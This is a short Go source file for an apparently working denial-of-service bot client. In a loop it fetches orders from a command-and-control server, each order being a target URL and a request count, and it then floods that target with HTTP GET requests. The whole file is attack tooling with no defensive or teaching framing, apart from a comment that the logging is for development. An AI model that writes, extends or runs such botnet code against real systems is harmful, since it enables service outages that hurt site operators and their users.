package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/fatih/color"
)

const SERVER = "127.0.0.1:3000"
const sleeptime = 3000

type Order struct {
	Target string `json:"target"`
	Count  int    `json:"count"`
}

var order Order

/*
  note: all the fmt.Println, color.Green/Blue/Red... and log.Panic, are just to run in development
*/

func runDos(target string, count int) {
	for i := 0; i < count; i++ {
		_, err := http.Get(target)
		if err != nil {
			fmt.Println(err)
		}
		color.Blue("request " + strconv.Itoa(i) + "/" + strconv.Itoa(count) + " to " + target)
	}
	fmt.Print(time.Now().Format("2006-01-02 15:04:05"))
	color.Green(" - all requests finalized")
}
func main() {
	for {
		fmt.Print(time.Now().Format("2006-01-02 15:04:05"))
		fmt.Println(" - getting order from server")
		res, err := http.Get("http://" + SERVER)
		if err != nil {
			fmt.Println("server not alive")
			time.Sleep(sleeptime * time.Millisecond)
			continue
		}
		decoder := json.NewDecoder(res.Body)
		err = decoder.Decode(&order)
		if err != nil {
			log.Panic(err)
		}
		if order.Target != "" {
			fmt.Print(time.Now().Format("2006-01-02 15:04:05"))
			color.Yellow("running Dos")
			runDos(order.Target, order.Count)
		}
		time.Sleep(sleeptime * time.Millisecond)
	}
}
